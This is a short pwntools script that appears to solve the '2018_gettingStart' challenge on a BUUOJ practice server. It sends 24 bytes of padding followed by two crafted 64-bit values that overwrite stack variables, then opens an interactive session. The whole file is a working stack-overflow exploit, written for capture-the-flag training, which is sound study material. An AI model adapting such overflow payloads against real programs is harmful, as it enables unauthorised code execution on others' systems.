#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 0
if local == 1:
    r=process('./2018_gettingStart')
    
    gdb.attach(r,'b * $rebase(0xA36)')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',28685)
    libc = ELF('./libc.so.6')

elf = ELF('./2018_gettingStart')

r.sendline(cyclic(24)+p64(0x7fffffffffffffff)+p64(0x3fb999999999999a))


r.interactive()
